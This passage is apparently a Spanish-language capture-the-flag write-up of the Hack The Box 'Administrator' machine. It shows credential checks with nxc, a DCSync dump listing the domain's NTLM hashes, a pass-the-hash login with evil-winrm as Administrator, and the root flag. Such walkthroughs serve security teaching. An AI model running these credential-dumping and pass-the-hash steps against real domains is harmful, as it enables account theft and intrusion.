a477ad9f43b8e80491c861d5c774213dd2d6d5e9766fe2afa21cf7cdafde6727e2ccd43acffa47b822b087dfdcbe11d0bcba892c73fdc2325cf2201101f2e3a85fe5b87b76935eb792631d0b4f5836e9f33c09c36608179ab6c0:limpbizkit
+</span></span></code></pre></div><p>Comprobación de credenciales:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.42 -u <span class="s1">&#39;ethan&#39;</span> -p <span class="s1">&#39;limpbizkit&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\e</span>than:limpbizkit
+</span></span></code></pre></div><h2 id="dcsync-attack---nxc">DCSync Attack - nxc<a hidden class="anchor" aria-hidden="true" href="#dcsync-attack---nxc">#</a></h2>
+<p><a href="https://books.spartan-cybersec.com/cpad/persistencia-y-post-explotacion-en-ad/dcsync">https://books.spartan-cybersec.com/cpad/persistencia-y-post-explotacion-en-ad/dcsync</a></p>
+<p>Vemos que el usuario ethan del cual tenemos control actualmente tiene los permisos <code>GetChangesAll</code> y <code>GetChanges</code> sobre el dominio ADMINISTRATOR.HTB.</p>
+<p><img alt="Administrator Machine 6" loading="lazy" src="fotos/Administrator_Machine_6.png"></p>
+<p>Estos permisos nos permiten con <code>nxc</code> ejecutar el ataque <code>DCSync</code>, que consiste en solicitar información sensible del domain controler haciéndonos pasar por otro &ldquo;domain controler&rdquo;. En este caso solicitamos todos los hash NTLM/NTHash de los usuarios del sistema pero el que nos interesa es el del usuario administrator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ❯ nxc smb 10.10.11.42 -u <span class="s1">&#39;ethan&#39;</span> -p <span class="s1">&#39;limpbizkit&#39;</span> -d <span class="s1">&#39;administrator.htb&#39;</span> --ntds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil <span class="o">[</span>Y/n<span class="o">]</span> y
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\e</span>than:limpbizkit
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>-<span class="o">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> Dumping the NTDS, this could take a <span class="k">while</span> so go grab a redbull...
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\o</span>livia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\m</span>ichael:1109:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\b</span>enjamin:1110:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\e</span>mily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\e</span>than:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\a</span>lexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC administrator.htb<span class="se">\e</span>mma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> Dumped <span class="m">11</span> NTDS hashes to /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds of which <span class="m">10</span> were added to the database
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> To extract only enabled accounts from the output file, run the following command:
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> cat /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds <span class="p">|</span> grep -iv disabled <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> grep -iv disabled /home/borhub/.nxc/logs/ntds/DC_10.10.11.42_2025-07-01_005803.ntds <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1
+</span></span></code></pre></div><p>Ahora haciendo Pass The Hass (PtH) vamos a abrirnos una shell remota como administrator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 10.10.11.42 -u Administrator -H <span class="s1">&#39;3dc553ce4b9fd20bd016e098d2d2fd2e&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/root.txt
+</span></span><span class="line"><span class="cl">d5de5a7bfa8f2aca3117e240ba182336
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/fluffy/">Fluffy</a></li>
+      <li><a href="https://borhuub.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/esc16/">ESC16</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://borhuub.github.io/writeups/fluffy/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Fluffy</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">My New Hugo Site</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
